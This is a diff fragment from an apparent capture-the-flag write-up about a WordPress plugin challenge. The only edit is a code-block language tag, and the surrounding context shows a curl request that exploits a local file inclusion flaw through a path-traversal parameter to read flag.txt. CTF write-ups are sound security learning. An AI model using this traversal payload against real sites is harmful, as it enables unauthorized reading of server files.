@@ -131,7 +131,7 @@ With that said, we found a **LFI vulnerability at path `wp-content/plugins/kiwib
 
 Armed with the above information, we can get the flag via sending the following GET request:
 
-```http
+```shell
 ┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/A-Nice-Block)-[2025.02.24|18:58:45(HKT)]
 └> curl --get http://52.77.81.199:9100/wp-content/plugins/kiwiblocks/src/admin-panel/views/panel.php --data 'tab=../../../../../../../../../../../../flag.txt' 
 <h1 class="kiwi_title">Kiwiblocks</h1>
